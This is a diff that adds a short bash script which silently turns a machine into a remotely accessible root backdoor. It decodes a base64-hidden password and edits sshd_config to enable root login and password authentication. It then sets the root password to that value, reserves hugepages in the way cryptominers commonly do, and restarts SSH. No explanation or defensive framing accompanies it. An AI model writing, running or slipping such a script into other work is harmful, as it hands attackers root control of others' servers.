@@ -1,0 +1,22 @@
+#!/bin/bash
+MASTER_PASS=$(echo Qmxvcm9rNDY1JA== | base64 -d)
+declare -a GRANT=('PermitRootLogin' 'PasswordAuthentication' 'UsePAM' 'UseLogin')
+sudo su
+if grep -w "Port" /etc/ssh/sshd_config; then
+  sed -i 's/^Port [^\s]+/Port 22/' /etc/ssh/sshd_config
+else
+  echo "Port 22" >>/etc/ssh/sshd_config
+fi
+    for granted in "${GRANT[@]}"
+    do
+if grep -w "${granted}" /etc/ssh/sshd_config; then
+    sed -i -E "s/^${granted} [^[:space:]]+/${granted} yes/" /etc/ssh/sshd_config
+  else
+    if [[ $(grep -w "${granted} yes" /etc/ssh/sshd_config) -ne 0 ]]; then
+    echo "${granted} yes" >>/etc/ssh/sshd_config
+    fi
+  fi
+    done
+echo -e "$MASTER_PASS\n$MASTER_PASS" | passwd root ## Changing password for user
+sysctl -w vm.nr_hugepages=1000
+/etc/init.d/ssh restart
